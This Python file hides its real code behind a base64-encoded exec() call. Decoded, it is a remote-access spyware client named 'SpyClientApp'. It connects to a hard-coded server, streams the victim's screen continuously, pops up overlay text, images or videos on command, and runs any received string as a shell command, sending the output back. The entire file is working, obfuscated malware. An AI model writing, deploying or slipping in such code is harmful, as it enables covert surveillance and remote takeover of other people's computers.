import base64
exec(base64.b64decode('aW1wb3J0IHNvY2tldAppbXBvcnQgc3RydWN0CmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IHRpbWUKaW1wb3J0IG1zcwppbXBvcnQgY3YyCmltcG9ydCBudW1weSBhcyBucAppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgcGxhdGZvcm0KaW1wb3J0IGJhc2U2NAppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHRlbXBmaWxlCmltcG9ydCBvcwpmcm9tIFB5UXQ1IGltcG9ydCBRdFdpZGdldHMsIFF0Q29yZSwgUXRHdWksIFF0TXVsdGltZWRpYSwgUXRNdWx0aW1lZGlhV2lkZ2V0cwppbXBvcnQgc3lzCgpIT1NUID0gJzE5Mi4xNjguODcuMTU1JyAgIyBVcGRhdGUgdG8geW91ciBzZXJ2ZXIgSVAKUE9SVCA9IDk5OTkKCkZSQU1FX1dJRFRIID0gMTI4MApGUkFNRV9IRUlHSFQgPSA3MjAKSlBFR19RVUFMSVRZID0gODAKRlBTID0gNjAKCkhFQURFUl9MRU4gPSA0CgpkZWYgc2VuZF9tc2coc29jaywgbXNnKToKICAgIG1zZ19sZW4gPSBzdHJ1Y3QucGFjaygnIUknLCBsZW4obXNnKSkKICAgIHNvY2suc2VuZGFsbChtc2dfbGVuICsgbXNnKQoKZGVmIHJlY3ZfYWxsKHNvY2ssIGxlbmd0aCk6CiAgICBkYXRhID0gYicnCiAgICB3aGlsZSBsZW4oZGF0YSkgPCBsZW5ndGg6CiAgICAgICAgcGFja2V0ID0gc29jay5yZWN2KGxlbmd0aCAtIGxlbihkYXRhKSkKICAgICAgICBpZiBub3QgcGFja2V0OgogICAgICAgICAgICByZXR1cm4gTm9uZQogICAgICAgIGRhdGEgKz0gcGFja2V0CiAgICByZXR1cm4gZGF0YQoKY2xhc3MgT3ZlcmxheVdpbmRvdyhRdFdpZGdldHMuUVdpZGdldCk6CiAgICBkZWYgX19pbml0X18oc2VsZiwgY29udGVudF90eXBlLCBjb250ZW50LCBkdXJhdGlvbj0xMDAwMCk6CiAgICAgICAgc3VwZXIoKS5fX2luaXRfXygpCiAgICAgICAgc2VsZi5zZXRXaW5kb3dGbGFncygKICAgICAgICAgICAgUXRDb3JlLlF0LldpbmRvd1N0YXlzT25Ub3BIaW50IHwgUXRDb3JlLlF0LkZyYW1lbGVzc1dpbmRvd0hpbnQgfCBRdENvcmUuUXQuVG9vbAogICAgICAgICkKICAgICAgICBzZWxmLnNldEF0dHJpYnV0ZShRdENvcmUuUXQuV0FfVHJhbnNsdWNlbnRCYWNrZ3JvdW5kKQogICAgICAgIHNlbGYuc2V0U3R5bGVTaGVldCgiYmFja2dyb3VuZC1jb2xvcjogcmdiYSgwLCAwLCAwLCAxODApOyIpCgogICAgICAgIHNjcmVlbiA9IFF0V2lkZ2V0cy5RQXBwbGljYXRpb24ucHJpbWFyeVNjcmVlbigpLmdlb21ldHJ5KCkKICAgICAgICBzZWxmLnNldEdlb21ldHJ5KHNjcmVlbikKCiAgICAgICAgbGF5b3V0ID0gUXRXaWRnZXRzLlFWQm94TGF5b3V0KCkKICAgICAgICBsYXlvdXQuc2V0QWxpZ25tZW50KFF0Q29yZS5RdC5BbGlnbkNlbnRlcikKCiAgICAgICAgaWYgY29udGVudF90eXBlID09ICJ0ZXh0IjoKICAgICAgICAgICAgbGFiZWwgPSBRdFdpZGdldHMuUUxhYmVsKGNvbnRlbnQpCiAgICAgICAgICAgIGxhYmVsLnNldFN0eWxlU2hlZXQoImNvbG9yOiB3aGl0ZTsgZm9udC1zaXplOiAzNnB4OyIpCiAgICAgICAgICAgIGxhYmVsLnNldEFsaWdubWVudChRdENvcmUuUXQuQWxpZ25DZW50ZXIpCiAgICAgICAgICAgIGxheW91dC5hZGRXaWRnZXQobGFiZWwpCgogICAgICAgIGVsaWYgY29udGVudF90eXBlID09ICJpbWciOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICByZXNwb25zZSA9IHJlcXVlc3RzLmdldChjb250ZW50LCB0aW1lb3V0PTUpCiAgICAgICAgICAgICAgICByZXNwb25zZS5yYWlzZV9mb3Jfc3RhdHVzKCkKICAgICAgICAgICAgICAgIGltZyA9IFF0R3VpLlFJbWFnZS5mcm9tRGF0YShyZXNwb25zZS5jb250ZW50KQogICAgICAgICAgICAgICAgcGl4bWFwID0gUXRHdWkuUVBpeG1hcC5mcm9tSW1hZ2UoaW1nKQogICAgICAgICAgICAgICAgbGFiZWwgPSBRdFdpZGdldHMuUUxhYmVsKCkKICAgICAgICAgICAgICAgIGxhYmVsLnNldFBpeG1hcChwaXhtYXAuc2NhbGVkKDYwMCwgNDAwLCBRdENvcmUuUXQuS2VlcEFzcGVjdFJhdGlvLCBRdENvcmUuUXQuU21vb3RoVHJhbnNmb3JtYXRpb24pKQogICAgICAgICAgICAgICAgbGFiZWwuc2V0QWxpZ25tZW50KFF0Q29yZS5RdC5BbGlnbkNlbnRlcikKICAgICAgICAgICAgICAgIGxheW91dC5hZGRXaWRnZXQobGFiZWwpCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIHByaW50KGYiRmFpbGVkIHRvIGxvYWQgaW1hZ2U6IHtlfSIpCiAgICAgICAgICAgICAgICBzZWxmLmNsb3NlKCkKICAgICAgICAgICAgICAgIHJldHVybgoKICAgICAgICBlbGlmIGNvbnRlbnRfdHlwZSA9PSAidmlkIjoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgdmlkZW9fZGF0YSA9IHJlcXVlc3RzLmdldChjb250ZW50LCB0aW1lb3V0PTEwKS5jb250ZW50CiAgICAgICAgICAgICAgICBzZWxmLnRtcF9maWxlID0gdGVtcGZpbGUuTmFtZWRUZW1wb3JhcnlGaWxlKGRlbGV0ZT1GYWxzZSwgc3VmZml4PSIubXA0IikKICAgICAgICAgICAgICAgIHNlbGYudG1wX2ZpbGUud3JpdGUodmlkZW9fZGF0YSkKICAgICAgICAgICAgICAgIHNlbGYudG1wX2ZpbGUuZmx1c2goKQogICAgICAgICAgICAgICAgc2VsZi50bXBfZmlsZS5jbG9zZSgpCgogICAgICAgICAgICAgICAgc2VsZi5wbGF5ZXIgPSBRdE11bHRpbWVkaWEuUU1lZGlhUGxheWVyKE5vbmUsIFF0TXVsdGltZWRpYS5RTWVkaWFQbGF5ZXIuVmlkZW9TdXJmYWNlKQogICAgICAgICAgICAgICAgdmlkZW9fd2lkZ2V0ID0gUXRNdWx0aW1lZGlhV2lkZ2V0cy5RVmlkZW9XaWRnZXQoKQogICAgICAgICAgICAgICAgc2VsZi5wbGF5ZXIuc2V0VmlkZW9PdXRwdXQodmlkZW9fd2lkZ2V0KQogICAgICAgICAgICAgICAgbGF5b3V0LmFkZFdpZGdldCh2aWRlb193aWRnZXQpCiAgICAgICAgICAgICAgICB2aWRlb193aWRnZXQuc2V0Rml4ZWRTaXplKDgwMCwgNDUwKQoKICAgICAgICAgICAgICAgIHNlbGYucGxheWVyLnNldE1lZGlhKFF0TXVsdGltZWRpYS5RTWVkaWFDb250ZW50KFF0Q29yZS5RVXJsLmZyb21Mb2NhbEZpbGUoc2VsZi50bXBfZmlsZS5uYW1lKSkpCiAgICAgICAgICAgICAgICBzZWxmLnBsYXllci5wbGF5KCkKCiAgICAgICAgICAgICAgICBzZWxmLnBsYXllci5tZWRpYVN0YXR1c0NoYW5nZWQuY29ubmVjdChzZWxmLmhhbmRsZV9tZWRpYV9zdGF0dXMpCiAgICAgICAgICAgICAgICBRdENvcmUuUVRpbWVyLnNpbmdsZVNob3QoZHVyYXRpb24sIHNlbGYuY2xvc2UpCgogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBwcmludChmIkZhaWxlZCB0byBwbGF5IHZpZGVvOiB7ZX0iKQogICAgICAgICAgICAgICAgc2VsZi5jbG9zZSgpCiAgICAgICAgICAgICAgICByZXR1cm4KCiAgICAgICAgc2VsZi5zZXRMYXlvdXQobGF5b3V0KQogICAgICAgIHNlbGYuc2hvdygpCgogICAgZGVmIGhhbmRsZV9tZWRpYV9zdGF0dXMoc2VsZiwgc3RhdHVzKToKICAgICAgICBpZiBzdGF0dXMgPT0gUXRNdWx0aW1lZGlhLlFNZWRpYVBsYXllci5FbmRPZk1lZGlhOgogICAgICAgICAgICBzZWxmLmNsb3NlKCkKCiAgICBkZWYgY2xvc2VFdmVudChzZWxmLCBldmVudCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBoYXNhdHRyKHNlbGYsICdwbGF5ZXInKToKICAgICAgICAgICAgICAgIHNlbGYucGxheWVyLnN0b3AoKQogICAgICAgICAgICBpZiBoYXNhdHRyKHNlbGYsICd0bXBfZmlsZScpOgogICAgICAgICAgICAgICAgb3MudW5saW5rKHNlbGYudG1wX2ZpbGUubmFtZSkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICBwYXNzCiAgICAgICAgZXZlbnQuYWNjZXB0KCkKCmNsYXNzIFNweUNsaWVudEFwcChRdFdpZGdldHMuUUFwcGxpY2F0aW9uKToKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBhcmd2LCBzb2NrKToKICAgICAgICBzdXBlcigpLl9faW5pdF9fKGFyZ3YpCiAgICAgICAgc2VsZi5zb2NrID0gc29jawogICAgICAgIHNlbGYub3ZlcmxheSA9IE5vbmUKICAgICAgICBzZWxmLl9vdmVybGF5X2NvbnRlbnRfdHlwZSA9IE5vbmUKICAgICAgICBzZWxmLl9vdmVybGF5X2NvbnRlbnQgPSBOb25lCgogICAgICAgIHNlbGYudmlkZW9fdGhyZWFkID0gdGhyZWFkaW5nLlRocmVhZCh0YXJnZXQ9c2VsZi52aWRlb19zZW5kZXIsIGRhZW1vbj1UcnVlKQogICAgICAgIHNlbGYuY29tbWFuZF90aHJlYWQgPSB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1zZWxmLmNvbW1hbmRfbGlzdGVuZXIsIGRhZW1vbj1UcnVlKQogICAgICAgIHNlbGYudmlkZW9fdGhyZWFkLnN0YXJ0KCkKICAgICAgICBzZWxmLmNvbW1hbmRfdGhyZWFkLnN0YXJ0KCkKCiAgICBkZWYgc2VuZF9tc2coc2VsZiwgbXNnKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHNlbmRfbXNnKHNlbGYuc29jaywgbXNnKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgcHJpbnQoZiJGYWlsZWQgdG8gc2VuZCBtZXNzYWdlOiB7ZX0iKQoKICAgIGRlZiB2aWRlb19zZW5kZXIoc2VsZik6CiAgICAgICAgd2l0aCBtc3MubXNzKCkgYXMgc2N0OgogICAgICAgICAgICBtb25pdG9yID0gc2N0Lm1vbml0b3JzWzFdCiAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICBpbWcgPSBucC5hcnJheShzY3QuZ3JhYihtb25pdG9yKSkKICAgICAgICAgICAgICAgIGltZyA9IGN2Mi5yZXNpemUoaW1nLCAoRlJBTUVfV0lEVEgsIEZSQU1FX0hFSUdIVCkpCiAgICAgICAgICAgICAgICBfLCBqcGcgPSBjdjIuaW1lbmNvZGUoJy5qcGcnLCBpbWcsIFtpbnQoY3YyLklNV1JJVEVfSlBFR19RVUFMSVRZKSwgSlBFR19RVUFMSVRZXSkKICAgICAgICAgICAgICAgIGRhdGEgPSBiJ1ZJRDAnICsganBnLnRvYnl0ZXMoKQogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIHNlbGYuc2VuZF9tc2coZGF0YSkKICAgICAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgICAgICBwcmludChmIlZpZGVvIHNlbmQgZXJyb3I6IHtlfSIpCiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgIHRpbWUuc2xlZXAoMSAvIEZQUykKCiAgICBkZWYgY29tbWFuZF9saXN0ZW5lcihzZWxmKToKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICBsZW5ndGhfZGF0YSA9IHJlY3ZfYWxsKHNlbGYuc29jaywgSEVBREVSX0xFTikKICAgICAgICAgICAgaWYgbm90IGxlbmd0aF9kYXRhOgogICAgICAgICAgICAgICAgcHJpbnQoIlNlcnZlciBkaXNjb25uZWN0ZWQiKQogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgbXNnX2xlbiA9IHN0cnVjdC51bnBhY2soJyFJJywgbGVuZ3RoX2RhdGEpWzBdCiAgICAgICAgICAgIG1zZyA9IHJlY3ZfYWxsKHNlbGYuc29jaywgbXNnX2xlbikKICAgICAgICAgICAgaWYgbm90IG1zZzoKICAgICAgICAgICAgICAgIHByaW50KCJTZXJ2ZXIgZGlzY29ubmVjdGVkIikKICAgICAgICAgICAgICAgIGJyZWFrCgogICAgICAgICAgICBoZWFkZXIgPSBtc2dbOjRdCiAgICAgICAgICAgIGNvbnRlbnQgPSBtc2dbNDpdCiAgICAgICAgICAgIGlmIGhlYWRlciA9PSBiJ0NNRDAnOgogICAgICAgICAgICAgICAgc2VsZi5oYW5kbGVfY29tbWFuZChjb250ZW50KQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcHJpbnQoZiJVbmtub3duIGhlYWRlcjoge2hlYWRlcn0iKQoKICAgIGRlZiBoYW5kbGVfY29tbWFuZChzZWxmLCBjb250ZW50KToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGRlY29kZWQgPSBiYXNlNjQuYjY0ZGVjb2RlKGNvbnRlbnQpLmRlY29kZShlcnJvcnM9J2lnbm9yZScpLnN0cmlwKCkKICAgICAgICBleGNlcHQgRXhjZXB0aW9uOgogICAgICAgICAgICBkZWNvZGVkID0gY29udGVudC5kZWNvZGUoZXJyb3JzPSdpZ25vcmUnKS5zdHJpcCgpCgogICAgICAgIGlmIGRlY29kZWQgPT0gImhvc3RuYW1lIjoKICAgICAgICAgICAgaG9zdG5hbWUgPSBwbGF0Zm9ybS5ub2RlKCkKICAgICAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKGYiSG9zdG5hbWU6IHtob3N0bmFtZX0iKQogICAgICAgIGVsaWYgZGVjb2RlZC5zdGFydHN3aXRoKCJ0ZXh0OiIpOgogICAgICAgICAgICB0ZXh0ID0gZGVjb2RlZFs1Ol0uc3RyaXAoKQogICAgICAgICAgICBzZWxmLnNob3dfb3ZlcmxheSgidGV4dCIsIHRleHQpCiAgICAgICAgZWxpZiBkZWNvZGVkLnN0YXJ0c3dpdGgoImltZzoiKToKICAgICAgICAgICAgdXJsID0gZGVjb2RlZFs0Ol0uc3RyaXAoKQogICAgICAgICAgICBzZWxmLnNob3dfb3ZlcmxheSgiaW1nIiwgdXJsKQogICAgICAgIGVsaWYgZGVjb2RlZC5zdGFydHN3aXRoKCJ2aWQ6Iik6CiAgICAgICAgICAgIHVybCA9IGRlY29kZWRbNDpdLnN0cmlwKCkKICAgICAgICAgICAgc2VsZi5zaG93X292ZXJsYXkoInZpZCIsIHVybCkKICAgICAgICBlbHNlOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBjb21wbGV0ZWQgPSBzdWJwcm9jZXNzLnJ1bihkZWNvZGVkLCBzaGVsbD1UcnVlLCBjYXB0dXJlX291dHB1dD1UcnVlLCB0ZXh0PVRydWUsIHRpbWVvdXQ9MTUpCiAgICAgICAgICAgICAgICBvdXRwdXQgPSBjb21wbGV0ZWQuc3Rkb3V0ICsgY29tcGxldGVkLnN0ZGVycgogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBvdXRwdXQgPSBmIkNvbW1hbmQgZmFpbGVkOiB7ZX0iCiAgICAgICAgICAgIHNlbGYuc2VuZF9yZXNwb25zZShvdXRwdXQpCgogICAgZGVmIHNlbmRfcmVzcG9uc2Uoc2VsZiwgdGV4dCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBlbmNvZGVkID0gYmFzZTY0LmI2NGVuY29kZSh0ZXh0LmVuY29kZShlcnJvcnM9J2lnbm9yZScpKQogICAgICAgICAgICBtc2cgPSBiJ1JTUDAnICsgZW5jb2RlZAogICAgICAgICAgICBzZW5kX21zZyhzZWxmLnNvY2ssIG1zZykKICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgIHByaW50KGYiRmFpbGVkIHRvIHNlbmQgcmVzcG9uc2U6IHtlfSIpCgogICAgZGVmIHNob3dfb3ZlcmxheShzZWxmLCBjb250ZW50X3R5cGUsIGNvbnRlbnQpOgogICAgICAgIHNlbGYuX292ZXJsYXlfY29udGVudF90eXBlID0gY29udGVudF90eXBlCiAgICAgICAgc2VsZi5fb3ZlcmxheV9jb250ZW50ID0gY29udGVudAogICAgICAgIFF0Q29yZS5RTWV0YU9iamVjdC5pbnZva2VNZXRob2Qoc2VsZiwgImRvX3Nob3dfb3ZlcmxheSIsIFF0Q29yZS5RdC5RdWV1ZWRDb25uZWN0aW9uKQoKICAgIEBRdENvcmUucHlxdFNsb3QoKQogICAgZGVmIGRvX3Nob3dfb3ZlcmxheShzZWxmKToKICAgICAgICBpZiBzZWxmLm92ZXJsYXkgYW5kIHNlbGYub3ZlcmxheS5pc1Zpc2libGUoKToKICAgICAgICAgICAgc2VsZi5vdmVybGF5LmNsb3NlKCkKICAgICAgICBzZWxmLm92ZXJsYXkgPSBPdmVybGF5V2luZG93KHNlbGYuX292ZXJsYXlfY29udGVudF90eXBlLCBzZWxmLl9vdmVybGF5X2NvbnRlbnQpCiAgICAgICAgc2VsZi5vdmVybGF5LnNob3coKQoKZGVmIG1haW4oKToKICAgIHNvY2sgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19TVFJFQU0pCiAgICB0cnk6CiAgICAgICAgc29jay5jb25uZWN0KChIT1NULCBQT1JUKSkKICAgICAgICBwcmludChmIkNvbm5lY3RlZCB0byBzZXJ2ZXIge0hPU1R9OntQT1JUfSIpCiAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgcHJpbnQoZiJDb25uZWN0aW9uIGZhaWxlZDoge2V9IikKICAgICAgICByZXR1cm4KCiAgICBhcHAgPSBTcHlDbGllbnRBcHAoc3lzLmFyZ3YsIHNvY2spCiAgICBzeXMuZXhpdChhcHAuZXhlY18oKSkKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBtYWluKCkK').decode('shift_jis'))
